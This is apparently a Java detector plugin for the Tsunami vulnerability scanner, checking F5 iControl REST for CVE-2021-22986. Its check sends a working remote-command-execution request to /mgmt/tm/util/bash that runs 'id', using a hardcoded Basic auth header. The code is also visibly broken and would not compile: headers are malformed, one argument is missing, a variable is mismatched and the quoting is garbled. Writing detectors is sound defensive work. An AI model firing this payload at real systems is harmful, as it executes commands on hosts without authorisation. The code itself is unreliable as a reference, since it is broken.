/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202122986;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;

import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

@PluginInfo(
		type = PluginType.VULN_DETECTION,
		name = "CVE-2021-22986",
		version = "0.1",
		description = "The iControl REST interface has an unauthenticated remote command execution vulnerability.",
		author = "wuqi5700",
		bootstrapModule = CVE202122986DetectorBootstrapModule.class)

public final class CVE202122986VulnDetector implements VulnDetector {

	private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

	private static final String CHECK_VUL_PATH = "/mgmt/tm/util/bash";

	public static final String DETECTION_STRING1 = "commandResult";
		
	public static final String DETECTION_STRING2 = "uid=";


	private final HttpClient httpClient;

	private final Clock utcClock;

	// by the scanner.
	@Inject
	CVE202122986VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
		this.httpClient = checkNotNull(httpClient);
		this.utcClock = checkNotNull(utcClock);
	}

	@Override
	public DetectionReportList detect(
			TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
		logger.atInfo().log("CVE-2021-22986 starts detecting.");

		return DetectionReportList.newBuilder()
				.addAllDetectionReports(
						matchedServices.stream()
								.filter(NetworkServiceUtils::isWebService)
								.filter(this::isServiceVulnerable)
								.map(networkService -> buildDetectionReport(targetInfo, networkService))
								.collect(toImmutableList()))
				.build();
	}

	private boolean isServiceVulnerable(NetworkService networkService) {


		String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) +"/mgmt/tm/util/bash";
		
		try {

			HttpResponse response2 = httpClient.send(
					post(targetUri)
							.setHeaders(
									HttpHeaders.builder()
											.addHeader(CONTENT_TYPE, "application/json")
											.addHeader(Content-Length, 39)
											.addHeader(Cache-Control, "max-age=0")
											.addHeader(Authorization, "Basic YWRtaW46QVNhc1M=")
											.addHeader(X-F5-Auth-Token, )
											.addHeader(Upgrade-Insecure-Requests, 1)
											.addHeader(CONNECTION, "close")
											.build())
											.setRequestBody(ByteString.copyFromUtf8(
									"{`\"command`\":`\"run`\",`\"utilCmdArgs`\":`\"-c id`\"}")).build(),
					networkService);

			if (response.bodyString().get().contains(DETECTION_STRING1) && response.bodyString().get().contains(DETECTION_STRING2) ) {
				return true;
			}

		} catch (IOException e) {
			logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
			return false;
		}
		return false;
	}
	// This builds the DetectionReport message for a specific vulnerable network service.
	private DetectionReport buildDetectionReport(
			TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
		return DetectionReport.newBuilder()
				.setTargetInfo(targetInfo)
				.setNetworkService(vulnerableNetworkService)
				.setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
				.setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
				.setVulnerability(
						Vulnerability.newBuilder()
								.setMainId(
										VulnerabilityId.newBuilder()
												.setPublisher("TSUNAMI_COMMUNITY")
												.setValue("CVE-2021-22986"))
								.setSeverity(Severity.HIGH)
								.setTitle("CVE-2021-22986")
								.setDescription("The iControl REST interface has an unauthenticated remote command execution vulnerability."))
				.build();
	}
}
